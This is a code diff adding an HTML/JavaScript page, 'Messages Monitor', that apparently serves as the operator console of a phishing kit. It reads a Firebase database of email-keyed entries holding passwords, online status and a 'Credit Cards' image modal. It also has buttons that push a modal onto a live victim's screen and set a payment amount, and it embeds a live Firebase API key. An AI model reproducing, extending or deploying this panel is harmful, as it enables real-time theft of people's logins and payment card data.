@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Messages Monitor</title>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            background-color: #f4f4f9;
+        }
+        h1 {
+            text-align: center;
+            color: #333;
+        }
+        .email-container {
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            background: #fff;
+            margin-bottom: 20px;
+            padding: 15px;
+            box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.1);
+        }
+        .email-container h3 {
+            margin: 0 0 10px;
+            color: #555;
+        }
+        .email-container p {
+            margin: 5px 0;
+            color: #666;
+        }
+        .email-container button {
+            margin-right: 5px;
+            padding: 5px 10px;
+            background: #007bff;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .email-container button:hover {
+            background: #0056b3;
+        }
+      .online {
+            color: green;
+            font-weight: bold;
+        }
+        .offline {
+            color: red;
+            font-weight: bold;
+        }
+
+    </style>
+</head>
+<body>
+    <h1>Messages Monitor</h1>
+     <!-- Input field for the unique code -->
+    <label for="uniqueCodeInput">Enter Unique Code (10 digits):</label>
+    <input type="text" id="uniqueCodeInput" maxlength="10" placeholder="Enter 10-digit code" />
+<div id="imageModal" style="display: none;  width: 100%; height: 100%; background: rgba(0, 0, 0, 0.7); z-index: 1000; align-items: center; justify-content: center; overflow-y: auto; border-radius: 10px;">
+    <div style="background: white;  border-radius: 10px;  width: 100%; text-align: center;">
+        <h3>Credit Cards</h3>
+        <div id="imageContainer">
+            <!-- Images will be loaded dynamically -->
+        </div>
+        <button id="closeModal" style="margin-top: 20px; padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer;">Close</button>
+    </div>
+</div>
+  
+    <div id="messagesDisplay">Loading messages...</div>
+<!-- Modal Structure -->
+
+    <script>
+        // Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyBZehk_8tWBhQOtCcS3VTzRRSCFCLvFGQA",
+            authDomain: "tuak-9f342.firebaseapp.com",
+            databaseURL: "https://tuak-9f342-default-rtdb.firebaseio.com",
+            projectId: "tuak-9f342",
+            storageBucket: "tuak-9f342.appspot.com",
+            messagingSenderId: "9176071516",
+            appId: "1:9176071516:web:38491206a78ed1c4035599",
+            measurementId: "G-BM58W3CJTQ"
+        };
+
+        // Initialize Firebase
+        const app = firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+// Get modal and close button elements
+
+      // Listen for updates to the `messages` node
+    const messagesRef = db.ref("messages");
+messagesRef.on("value", (snapshot) => {
+    const data = snapshot.val();
+    const messagesDisplay = document.getElementById("messagesDisplay");
+const modal = document.getElementById("imageModal");
+const imageContainer = document.getElementById("imageContainer");
+const closeModalButton = document.getElementById("closeModal");
+
+// Function to open the modal with images
+function openModal(images) {
+    // Clear any previous images
+    imageContainer.innerHTML = "";
+
+    // Load each image into the modal
+    images.forEach((imageUrl) => {
+        const img = document.createElement("img");
+        img.src = imageUrl;
+        img.style.maxWidth = "100%";
+        img.style.marginBottom = "10px";
+        imageContainer.appendChild(img);
+    });
+
+    // Show the modal
+    modal.style.display = "flex";
+document.getElementById("messagesDisplay").style.display ='none'
+}
+
+// Close modal when the close button is clicked
+closeModalButton.addEventListener("click", () => {
+    modal.style.display = "none";
+document.getElementById("messagesDisplay").style.display ='block'
+});
+    if (data) {
+        // Clear the display
+        messagesDisplay.innerHTML = "";
+
+        const onlineMessages = [];
+        const offlineMessages = [];
+
+        // Categorize messages as online or offline
+        for (const emailKey in data) {
+            const userData = data[emailKey];
+            let isOnline = false;
+
+            // Check if any field under the emailKey has the value "online"
+            for (const key in userData) {
+                if (userData[key] === "online") {
+                    isOnline = true;
+                    break;
+                }
+            }
+
+            if (isOnline) {
+                onlineMessages.push({ emailKey, ...userData });
+            } else {
+                offlineMessages.push({ emailKey, ...userData });
+            }
+        }
+
+        // Combine online and offline messages (online first)
+        const sortedMessages = [...onlineMessages, ...offlineMessages];
+
+        // Display sorted messages
+        sortedMessages.forEach(({ emailKey, ...userData }) => {
+            // Create a container for the email data
+            const emailContainer = document.createElement("div");
+            emailContainer.classList.add("email-container");
+
+            // Email header
+            const emailHeader = document.createElement("h3");
+            emailHeader.textContent = `Email: ${emailKey.replace(/,/g, ".")}`;
+            emailContainer.appendChild(emailHeader);
+
+            // Add details dynamically
+            for (const key in userData) {
+                const value = userData[key];
+
+                if (key === "password") continue; // Skip the password field
+
+                const detail = document.createElement("p");
+                if (value === "online") {
+                    detail.innerHTML = `${key}: <span class="online">${value}</span>`;
+                } else if (value === "offline") {
+                    detail.innerHTML = `${key}: <span class="offline">${value}</span>`;
+                } else {
+                    detail.textContent = `${key}: ${value}`;
+                }
+                emailContainer.appendChild(detail);
+            }
+
+            // Add Delete Password button
+            const deleteButton = document.createElement("button");
+            deleteButton.textContent = "Delete Password";
+            deleteButton.addEventListener("click", () => {
+                const emailRef = db.ref(`messages/${emailKey}/password`);
+                emailRef.remove()
+                    .then(() => {
+                        console.log(`Password deleted for ${emailKey}`);
+                        alert(`Password deleted for ${emailKey}`);
+                    })
+                    .catch((error) => {
+                        console.error("Error deleting password:", error);
+                    });
+            });
+            emailContainer.appendChild(deleteButton);
+
+         // Add the button to set `modal5_display: true` for this email
+                    const showModalButton = document.createElement("button");
+                    showModalButton.textContent = "Show Modal for 1 Minute";
+                    const timerDisplay = document.createElement("span"); // To display the countdown timer
+                    timerDisplay.classList.add("timer"); // Style for timer display
+                    timerDisplay.id = `timer-${emailKey}`; // Add unique ID for each email timer
+                    emailContainer.appendChild(timerDisplay);
+
+                    showModalButton.addEventListener("click", () => {
+                        const modal5DisplayRef = db.ref(`messages/${emailKey}/modal5_display`);
+                        const modal5StatusRef = db.ref(`messages/${emailKey}/modal_5_status`);
+                        const timestampRef = db.ref(`messages/${emailKey}/modal5_display_timestamp`);
+
+                        // Set modal5_display to true
+                        modal5DisplayRef.set(true)
+                            .then(() => {
+                                console.log(`modal5_display set to true for ${emailKey}`);
+                                
+                                // Set a timestamp for when the button was clicked
+                                timestampRef.set(Date.now());
+
+                                // Display countdown timer
+                                let timeLeft = 60; // 60 seconds for countdown
+                                const timerElement = document.getElementById(`timer-${emailKey}`);
+                                timerElement.textContent = `Timer: ${timeLeft}s`;
+
+                                // Update every second
+                                const intervalId = setInterval(() => {
+                                    timeLeft--;
+                                    timerElement.textContent = `Timer: ${timeLeft}s`;
+                                    if (timeLeft <= 0) {
+                                        clearInterval(intervalId);
+                                    }
+                                }, 1000);
+
+                                // Start a 1-minute timer to delete modal5_display if modal_5_status is still offline
+                                setTimeout(() => {
+                                    // Check if the modal_5_status is still offline after 1 minute
+                                    modal5StatusRef.once("value", (statusSnapshot) => {
+                                        const status = statusSnapshot.val();
+                                        if (status !== "online") {
+                                            // Delete modal5_display if still offline
+                                            modal5DisplayRef.remove()
+                                                .then(() => {
+                                                    console.log(`modal5_display deleted for ${emailKey} after 1 minute`);
+                                                })
+                                                .catch((error) => {
+                                                    console.error("Error deleting modal5_display:", error);
+                                                });
+                                        }
+                                    });
+                                }, 60000); // 1 minute
+                            })
+                            .catch((error) => {
+                                console.error("Error setting modal5_display:", error);
+                            });
+                    });
+                    emailContainer.appendChild(showModalButton);
+
+                    // Add the button to delete `modal5_display` for this email
+                    const deleteModalButton = document.createElement("button");
+                    deleteModalButton.textContent = "Delete Modal5 Display";
+                    deleteModalButton.addEventListener("click", () => {
+                        const modal5DisplayRef = db.ref(`messages/${emailKey}/modal5_display`);
+                        modal5DisplayRef.remove()
+                            .then(() => {
+                                console.log(`modal5_display deleted for ${emailKey}`);
+                            })
+                            .catch((error) => {
+                                console.error("Error deleting modal5_display:", error);
+                            });
+                    });
+                    emailContainer.appendChild(deleteModalButton);
+
+                    // Add the container to the display
+                    messagesDisplay.appendChild(emailContainer);
+                });
+            } 
+            });
+
+
+  // Listen for input change and validate the unique code
+        const uniqueCodeInput = document.getElementById("uniqueCodeInput");
+
+        uniqueCodeInput.addEventListener("input", (event) => {
+            const code = event.target.value.trim();  // Trim any extra spaces
+
+            // Log the entered code for debugging
+            console.log("Entered code:", code);
+
+            // Check if the code has exactly 10 digits
+            if (code.length === 10 && !isNaN(code)) {
+                // Convert code to number for comparison
+                const codeNumber = parseInt(code, 10);
+
+                // Search for the code in the messages node
+                messagesRef.once("value", (snapshot) => {
+                    const messagesData = snapshot.val();
+
+                    if (messagesData) {
+                        let found = false;
+                        // Check each email to find if any contains the matching unique code
+                        for (const emailKey in messagesData) {
+                            const userData = messagesData[emailKey];
+
+                            // Log the user data to see if uniqueCode exists
+                            console.log("Checking user:", emailKey, "Data:", JSON.stringify(userData, null, 2));
+
+                            // Check if this user has the uniqueCode matching the entered code (convert both to numbers)
+                            if (userData.uniqueCode && userData.uniqueCode === codeNumber) {
+                                found = true;
+                                console.log("Match found for code:", codeNumber);
+
+                                // Update the amount for this user with the matching code
+                                const amountRef = db.ref(`messages/${emailKey}/amount`);
+                                amountRef.set(2876)
+                                    .then(() => {
+                                        console.log("Amount updated successfully.");
+                                    })
+                                    .catch((error) => {
+                                        console.error("Error updating amount:", error);
+                                    });
+                                break;
+                            }
+                        }
+
+                        // Log if no match was found
+                        if (!found) {
+                            console.log("No match found for the entered code:", codeNumber);
+                        }
+                    } else {
+                        console.log("No messages found in the database.");
+                    }
+                });
+            }
+        });
+       
+  
+    </script>
+</body>
+</html>
